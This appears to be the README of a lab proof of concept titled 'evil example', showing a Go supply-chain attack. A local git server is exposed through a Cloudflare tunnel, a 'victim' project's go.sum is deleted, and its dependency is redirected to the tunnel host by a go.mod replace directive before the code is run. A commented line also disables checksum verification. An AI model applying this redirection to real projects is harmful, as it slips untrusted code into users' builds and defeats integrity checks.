# evil example

## Manual

```shell
docker compose down --remove-orphans

# up git server and the cloudflare tunnel, find the <foo>.trycloudflare.com from logs
docker compose up --build --pull always

# git clone http://127.0.0.1/foo
git clone https://<foo>.trycloudflare.com/foo

cd victim
rm go.sum
cp go.mod.tpl go.mod
go mod edit -replace 127.0.0.1/foo.git@v1.0.0=<foo>.trycloudflare.com/foo.git@v1.0.0
# GOSUMDB=off GOPROXY=direct GOINSECURE="127.0.0.1/*" go get -x -v 127.0.0.1/foo.git
go mod tidy
go run .
```

## Ref

- https://esc.sh/blog/setting-up-a-git-http-server-with-nginx/
  - https://github.com/louislef299/go-scripts/tree/f7e9fe06c5a513435473862b8bb85c3c99b180be/projects/nginx-git
